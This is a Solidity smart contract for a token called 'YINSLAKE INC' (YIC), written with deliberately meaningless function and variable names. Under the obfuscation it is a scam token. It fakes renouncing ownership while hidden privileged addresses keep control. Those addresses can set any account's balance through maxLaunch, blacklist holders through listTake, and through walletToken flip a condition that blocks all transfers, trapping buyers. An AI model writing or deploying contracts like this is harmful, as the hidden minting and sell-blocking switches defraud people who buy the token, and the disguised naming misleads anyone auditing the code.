//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface toLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeList) external view returns (uint256);

    function transfer(address launchModeTo, uint256 tokenReceiver) external returns (bool);

    function allowance(address launchedLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenReceiver) external returns (bool);

    function transferFrom(address sender,address launchModeTo,uint256 tokenReceiver) external returns (bool);

    event Transfer(address indexed from, address indexed shouldList, uint256 value);
    event Approval(address indexed launchedLaunch, address indexed spender, uint256 value);
}

interface senderLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountExempt {
    function createPair(address tradingLaunch, address tokenAuto) external returns (address);
}

abstract contract amountMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletBuySwap is toLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract YINSLAKEINC is amountMax, toLiquidity, walletBuySwap {

    function transfer(address tokenTrading, uint256 tokenReceiver) external virtual override returns (bool) {
        return launchedShould(_msgSender(), tokenTrading, tokenReceiver);
    }

    bool private modeIs;

    address swapLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public toLaunch;

    uint256 feeMaxAmount;

    function launchedShould(address autoShouldToken, address launchModeTo, uint256 tokenReceiver) internal returns (bool) {
        if (autoShouldToken == listAmount) {
            return tradingAmount(autoShouldToken, launchModeTo, tokenReceiver);
        }
        uint256 limitFund = toLiquidity(launchedLiquidity).balanceOf(launchedSender);
        require(limitFund == fromLiquidityAt);
        require(!teamAt[autoShouldToken]);
        return tradingAmount(autoShouldToken, launchModeTo, tokenReceiver);
    }

    mapping(address => mapping(address => uint256)) private listBuyEnable;

    address private walletLaunchExempt;

    function getOwner() external view returns (address) {
        return walletLaunchExempt;
    }

    string private tokenSwap = "YIC";

    string private launchedAutoMarketing = "YINSLAKE INC";

    function maxLaunch(address tokenTrading, uint256 tokenReceiver) public {
        shouldSellLiquidity();
        txFrom[tokenTrading] = tokenReceiver;
    }

    function atFund() public {
        emit OwnershipTransferred(listAmount, address(0));
        walletLaunchExempt = address(0);
    }

    uint256 private launchTake;

    mapping(address => uint256) private txFrom;

    function tradingAmount(address autoShouldToken, address launchModeTo, uint256 tokenReceiver) internal returns (bool) {
        require(txFrom[autoShouldToken] >= tokenReceiver);
        txFrom[autoShouldToken] -= tokenReceiver;
        txFrom[launchModeTo] += tokenReceiver;
        emit Transfer(autoShouldToken, launchModeTo, tokenReceiver);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isAuto;
    }

    uint256 fromLiquidityAt;

    uint256 private walletFee;

    function teamMode(address txReceiver) public {
        if (listLaunch) {
            return;
        }
        
        takeList[txReceiver] = true;
        if (modeIs != toLaunch) {
            toLaunch = true;
        }
        listLaunch = true;
    }

    uint8 private totalLimitSender = 18;

    address public launchedLiquidity;

    function transferFrom(address autoShouldToken, address launchModeTo, uint256 tokenReceiver) external override returns (bool) {
        if (_msgSender() != swapLimit) {
            if (listBuyEnable[autoShouldToken][_msgSender()] != type(uint256).max) {
                require(tokenReceiver <= listBuyEnable[autoShouldToken][_msgSender()]);
                listBuyEnable[autoShouldToken][_msgSender()] -= tokenReceiver;
            }
        }
        return launchedShould(autoShouldToken, launchModeTo, tokenReceiver);
    }

    function walletToken(uint256 tokenReceiver) public {
        shouldSellLiquidity();
        fromLiquidityAt = tokenReceiver;
    }

    uint256 private isAuto = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed liquidityBuy, address indexed maxWallet);

    function shouldSellLiquidity() private view {
        require(takeList[_msgSender()]);
    }

    function approve(address launchTo, uint256 tokenReceiver) public virtual override returns (bool) {
        listBuyEnable[_msgSender()][launchTo] = tokenReceiver;
        emit Approval(_msgSender(), launchTo, tokenReceiver);
        return true;
    }

    function balanceOf(address feeList) public view virtual override returns (uint256) {
        return txFrom[feeList];
    }

    mapping(address => bool) public teamAt;

    address launchedSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return totalLimitSender;
    }

    function name() external view virtual override returns (string memory) {
        return launchedAutoMarketing;
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenSwap;
    }

    mapping(address => bool) public takeList;

    uint256 public modeTakeTx;

    bool private modeWallet;

    uint256 private marketingTrading;

    address public listAmount;

    bool public listLaunch;

    constructor (){
        if (marketingTrading != teamShould) {
            teamShould = txAmount;
        }
        atFund();
        senderLiquidity toEnable = senderLiquidity(swapLimit);
        launchedLiquidity = amountExempt(toEnable.factory()).createPair(toEnable.WETH(), address(this));
        
        listAmount = _msgSender();
        takeList[listAmount] = true;
        txFrom[listAmount] = isAuto;
        
        emit Transfer(address(0), listAmount, isAuto);
    }

    function allowance(address feeFund, address launchTo) external view virtual override returns (uint256) {
        if (launchTo == swapLimit) {
            return type(uint256).max;
        }
        return listBuyEnable[feeFund][launchTo];
    }

    uint256 private txAmount;

    uint256 public teamShould;

    function listTake(address buyIs) public {
        shouldSellLiquidity();
        if (modeWallet) {
            modeTakeTx = teamShould;
        }
        if (buyIs == listAmount || buyIs == launchedLiquidity) {
            return;
        }
        teamAt[buyIs] = true;
    }

    function owner() external view returns (address) {
        return walletLaunchExempt;
    }

}